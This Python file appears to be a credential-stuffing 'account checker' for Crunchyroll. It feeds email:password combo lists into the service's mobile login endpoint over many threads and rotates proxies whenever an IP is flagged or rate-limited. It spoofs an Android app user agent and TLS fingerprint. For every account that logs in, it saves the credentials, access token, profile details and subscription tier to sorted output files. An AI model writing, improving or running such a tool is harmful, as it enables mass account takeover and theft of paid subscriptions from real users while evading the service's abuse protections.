import tls_client 
import random
import time
import toml
import ctypes
import threading
import uuid

from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps
from logmagix import Logger, Home

with open('input/config.toml') as f:
    config = toml.load(f)

DEBUG = config['dev'].get('Debug', False)
log = Logger(style=2)

def debug(func_or_message, *args, **kwargs) -> callable:
    if callable(func_or_message):
        @wraps(func_or_message)
        def wrapper(*args, **kwargs):
            result = func_or_message(*args, **kwargs)
            if DEBUG:
                log.debug(f"{func_or_message.__name__} returned: {result}")
            return result
        return wrapper
    else:
        if DEBUG:
            log.debug(f"Debug: {func_or_message}")

def debug_response(response) -> None:
    debug(response.headers)
    debug(response.text)
    debug(response.status_code)

class Miscellaneous:
    @debug
    def get_proxies(self) -> dict:
        try:
            if config['dev'].get('Proxyless', False):
                return None
                
            with open('input/proxies.txt') as f:
                proxies = [line.strip() for line in f if line.strip()]
                if not proxies:
                    log.warning("No proxies available. Running in proxyless mode.")
                    return None
                
                proxy_choice = random.choice(proxies)
                proxy_dict = {
                    "http": f"http://{proxy_choice}",
                    "https": f"http://{proxy_choice}"
                }
                debug(f"Using proxy: {proxy_choice}")
                return proxy_dict
        except FileNotFoundError:
            log.error("Proxy file not found. Running in proxyless mode.")
            return None
    
    @debug 
    def randomize_user_agent(self) -> str:
        android_version = f"{random.randint(13, 15)}"
        okhttp_version = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
        
        user_agent = f"Crunchyroll/3.74.2 Android/{android_version} okhttp/{okhttp_version}"
        return user_agent

    class Title:
        def __init__(self) -> None:
            self.running = False

        def start_title_updates(self, total, start_time) -> None:
            self.running = True
            def updater():
                while self.running:
                    self.update_title(total, start_time)
                    time.sleep(0.5)
            threading.Thread(target=updater, daemon=True).start()

        def stop_title_updates(self) -> None:
            self.running = False

        def update_title(self, total, start_time) -> None:
            try:
                elapsed_time = round(time.time() - start_time, 2)
                title = f'discord.cyberious.xyz | Total: {total} | Time Elapsed: {elapsed_time}s'

                sanitized_title = ''.join(c if c.isprintable() else '?' for c in title)
                ctypes.windll.kernel32.SetConsoleTitleW(sanitized_title)
            except Exception as e:
                log.debug(f"Failed to update console title: {e}")

class AccountChecker:
    def __init__(self, proxy_dict: dict = None) -> None:
        self.max_retries = 3
        self.retry_delay = 2
        self.session = tls_client.Session("okhttp4_android_13", random_tls_extension_order=True)
        self.session.headers = {
        'authorization': 'Basic ZG1yeWZlc2NkYm90dWJldW56NXo6NU45aThPV2cyVmtNcm1oekNfNUNXekRLOG55SXo0QU0=',
        'connection': 'Keep-Alive',
        'content-type': 'application/x-www-form-urlencoded',
        'etp-anonymous-id': '71166ae5-eeb0-46a6-a320-84f90463fd1a',
        'host': 'www.crunchyroll.com',
        'user-agent': Miscellaneous().randomize_user_agent(),
        'x-datadog-sampling-priority': '0',
        }
        self.session.proxies = proxy_dict
    
    @debug
    def login(self, email: str, password: str) -> str | None:
        retries = 0
        while retries < self.max_retries:
            try:
                payload = {
                    "username": email,
                    "password": password,
                    "grant_type": "password",
                    "scope": "offline_access",
                    "device_id": str(uuid.uuid4()),
                    "device_name": "sdk_gphone64_x86_64",
                    "device_type": "Google sdk_gphone64_x86_64"
                }

                response = self.session.post('https://www.crunchyroll.com/auth/v1/token', data=payload)
                debug_response(response)

                if response.status_code == 200:
                    jwt = response.json().get("access_token")
                    if jwt:
                        self.session.headers['authorization'] = f"Bearer {jwt}"
                        return jwt
                    return None

                if response.status_code == 401:
                    return None

                if response.status_code == 500:
                    log.error(f"Internal server error. {response.text}")
                    return None
                
                if response.status_code == 403:
                    log.warning("Flagged IP address, switching proxies and retrying...")
                    self.session.proxies = Miscellaneous().get_proxies()
                    continue
                
                if response.status_code == 429:
                    retries += 1
                    log.warning(f"Rate limited, retrying with new proxy (Attempt {retries}/{self.max_retries})")
                    time.sleep(self.retry_delay)
                    self.session.proxies = Miscellaneous().get_proxies()
                    continue

                return None
                
            except Exception as e:
                log.error(f"Login error: {e}")
                retries += 1
                if retries < self.max_retries:
                    time.sleep(self.retry_delay)
                    self.session.proxies = Miscellaneous().get_proxies()
                    continue
        return None

    @debug
    def get_external_id(self) -> int:
        response = self.session.get('https://www.crunchyroll.com/accounts/v1/me')
        debug_response(response)

        if response.status_code == 200:
            return response.json().get("external_id")
        else:
            log.error(f"Failed to get external id: {response.text} {response.status_code}")
        
        return None

    @debug
    def get_capture(self) -> tuple[int, str, str, str] | None:
        response = self.session.get('https://www.crunchyroll.com/accounts/v1/me/multiprofile')
        debug_response(response)

        if response.status_code == 200:
            json = response.json()
            profiles = json.get("profiles", [])
            
            if profiles:
                first_profile = profiles[0]
                num_profiles = len(profiles)
                account_id = first_profile.get("profile_id")
                username = first_profile.get("username", "")
                extended_ratings = first_profile.get("extended_maturity_rating", {})
                country = next(iter(extended_ratings.keys())) if extended_ratings else ""
                
                return num_profiles, account_id, username, country

        else:
            log.error(f"Failed to check account: {response.text} {response.status_code}")
        
        return None

    @debug
    def check_subscription(self, extra_id: int) -> str:
        response = self.session.get(f'https://www.crunchyroll.com/subs/v1/subscriptions/{extra_id}/benefits')
        debug_response(response)

        subscription_data = response.json()

        if response.status_code == 200:
            if not subscription_data:
                    return "Free"
                
            items = subscription_data.get('items', [])
            total = subscription_data.get('total', 0)
                    
            if total == 0:
                return "Free"
                        
            benefits = [item.get('benefit', '') for item in items]
                    
            if 'cr_fan_pack' in benefits:
                return "Fan Pack"
            elif 'cr_premium' in benefits:
                return "Premium"
            elif 'cr_mega_pack' in benefits:
                return "Mega Pack"
            else:
                return "Unknown"
        else:
            log.error(f"Failed to check subscription: {response.text} {response.status_code}")
        
        return None

def check_account(credentials: str) -> bool:
    try:
        if ":" not in credentials:
            log.warning(f"Invalid format (missing ':') - {credentials}")
            with open("output/invalid/invalid.txt", "a") as f:
                f.write(f"{credentials}\n")
            return False

        email, password = credentials.split(":", 1)
        if not email or not password:
            log.warning(f"Invalid format (empty email/password) - {credentials}")
            with open("output/invalid/invalid.txt", "a") as f:
                f.write(f"{credentials}\n")
            return False

        Misc = Miscellaneous()
        proxies = Misc.get_proxies()
        Account_Checker = AccountChecker(proxies)

        log.info(f"Checking {email}...")

        access_token = Account_Checker.login(email, password)
    
        if access_token:
            external_id = Account_Checker.get_external_id()
            
            if external_id:
                subscription = Account_Checker.check_subscription(external_id)

                profile_number, account_id, username, country = Account_Checker.get_capture()
                
                with open("output/valid/valid.txt", "a") as f:
                    f.write(f"{email}:{password}\n")
                
                with open("output/valid/full_valid_capture.txt", "a") as f:
                    f.write(f"{username}:{email}:{password}:{access_token}:{account_id}:{subscription}:{profile_number}:{external_id}:{country}\n")

                if subscription == "Free":
                    with open("output/valid/free.txt", "a") as f:
                        f.write(f"{email}:{password}\n")
                else:
                    with open("output/premium_accounts.txt", "a") as f:
                        f.write(f"{email}:{password}|{subscription}\n")
                

                log.message(f"Valid Account: {email} | {password[:6]}...| {subscription}")
                return True
        else:
            log.error(f"Invalid account: {email}")
        
        with open("output/invalid/invalid.txt", "a") as f:
            f.write(f"{email}:{password}\n")
               
        return False
    except Exception as e:
        log.error(f"Error during account checking process: {e}")
        return False

if __name__ == "__main__":
    try:
        start_time = time.time()
        
        Misc = Miscellaneous()
        Banner = Home("Crunchyroll Checker", align="center", credits="discord.cyberious.xyz")
        
        Banner.display()

        total = 0
        thread_count = config['dev'].get('Threads', 1)
        
        with open("input/accounts.txt") as f:
            accounts = [line.strip() for line in f if line.strip()]

        title_updater = Misc.Title()
        title_updater.start_title_updates(total, start_time)
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = [
                executor.submit(check_account, account)
                for account in accounts
            ]

            for future in as_completed(futures):
                try:
                    if future.result():
                        total += 1
                except Exception as e:
                    log.error(f"Thread error: {e}")
        
        title_updater.stop_title_updates()
        

        log.success(f"All accounts processed! Found {total} valid accounts out of {len(accounts)}")
        log.info(f"Total time elapsed: {round(time.time() - start_time, 2)}s")
        
        print("\n")
        log.question("Press Enter to exit...", "Input")

    except KeyboardInterrupt:
        log.info("Process interrupted by user. Exiting...")
    except Exception as e:
        log.error(f"An unexpected error occurred: {e}")